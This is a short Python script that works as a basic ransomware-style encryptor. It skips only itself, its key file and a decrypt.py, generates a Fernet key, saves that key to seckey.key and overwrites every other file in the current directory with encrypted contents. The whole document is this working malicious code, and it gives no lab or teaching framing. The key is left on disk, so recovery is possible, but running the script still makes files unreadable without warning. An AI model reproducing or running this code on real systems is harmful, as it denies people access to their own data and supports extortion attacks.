import os
from cryptography.fernet import Fernet


files=[]

for file in os.listdir():

    if file =='rw.py' or file == 'seckey.key'or file=='decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()
print(key)
with open("seckey.key","wb") as k :
    k.write(key)

for file in files :
    with open(file, 'rb') as theFile :
        content = theFile.read()
    encrypted_content = Fernet(key).encrypt(content)

    with open(file, 'wb') as thefile :
        thefile.write(encrypted_content)